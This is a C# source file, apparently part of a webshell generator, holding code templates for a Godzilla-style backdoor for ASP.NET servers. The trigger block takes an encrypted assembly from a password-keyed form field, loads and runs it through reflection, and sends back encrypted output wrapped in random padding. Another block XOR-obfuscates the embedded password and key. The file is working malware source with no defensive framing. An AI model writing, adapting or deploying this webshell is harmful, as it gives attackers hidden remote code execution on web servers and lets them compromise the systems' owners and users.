namespace NMG.Shells;

public static class GodzillaCSharp
{
    public const string TriggerBlock = """
        System.Web.HttpContext Ctx = System.Web.HttpContext.Current;
        System.Web.HttpResponse Resp = Ctx.Response;
        try
        {
            if (Ctx.Request.ContentType.Contains("www-form") && Ctx.Request[{{PASSWORD}}] != null)
            {
                string md5 = System.BitConverter.ToString(
                    new System.Security.Cryptography.MD5CryptoServiceProvider().ComputeHash(
                        System.Text.Encoding.Default.GetBytes({{PASSWORD}} + {{KEY}}))).Replace("-", "");
                byte[] data = System.Convert.FromBase64String(Ctx.Request[{{PASSWORD}}]);
                data = new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(
                    System.Text.Encoding.Default.GetBytes({{KEY}}),
                    System.Text.Encoding.Default.GetBytes({{KEY}})).TransformFinalBlock(data, 0, data.Length);
                if (payload == null)
                {
                    payload = (System.Reflection.Assembly)typeof(System.Reflection.Assembly).GetMethod("Load",
                        new System.Type[] { typeof(byte[]) }).Invoke(null, new object[] { data });
                }
                else
                {
                    object o = payload.CreateInstance("LY");
                    System.IO.MemoryStream outStream = new System.IO.MemoryStream();
                    o.Equals(outStream);
                    o.Equals(data);
                    o.ToString();
                    byte[] r = outStream.ToArray();
                    if (r.Length > 0)
                    {
                        outStream.Dispose();
                        Resp.Write(GenerateRandomString(rd.Next(5, 50)));
                        Resp.Write(md5.Substring(0, 16));
                        Resp.Write(System.Convert.ToBase64String(
                            new System.Security.Cryptography.RijndaelManaged().CreateEncryptor(
                                System.Text.Encoding.Default.GetBytes({{KEY}}),
                                System.Text.Encoding.Default.GetBytes({{KEY}})).TransformFinalBlock(r, 0, r.Length)));
                        Resp.Write(md5.Substring(16));
                        Resp.Write(GenerateRandomString(rd.Next(10, 60)));
                        Resp.End();
                    }
                }
            }
        }
        catch (Exception)
        {
        }
        """;

    public const string MembersBlock = """
        internal static string XD(byte[] d, byte k)
        {
            byte[] r = new byte[d.Length];
            for (int i = 0; i < d.Length; i++) { r[i] = (byte)(d[i] ^ k); }
            return System.Text.Encoding.UTF8.GetString(r);
        }
        public string password = XD({{PASSWORD_ENC}}, {{XOR_KEY}});
        public string key = XD({{KEY_ENC}}, {{XOR_KEY}});
        private System.Reflection.Assembly payload;
        private System.Random rd = new System.Random();
        public static bool load = false;
        """;

    public const string RandomStringBlock = """
        public static string GenerateRandomString(int length)
        {
            char[] constant = new char[0x7e - 0x20];
            for (int i = 0; i < constant.Length; i++)
            {
                constant[i] = (char)(i + 0x20);
            }
            System.Text.StringBuilder sb = new System.Text.StringBuilder();
            byte[] b = new byte[4];
            new System.Security.Cryptography.RNGCryptoServiceProvider().GetBytes(b);
            System.Random rd = new System.Random(System.BitConverter.ToInt32(b, 0));
            for (int i = 0; i < length; i++)
            {
                sb.Append(constant[rd.Next(constant.Length - 1)].ToString());
            }
            return sb.ToString();
        }
        """;
}
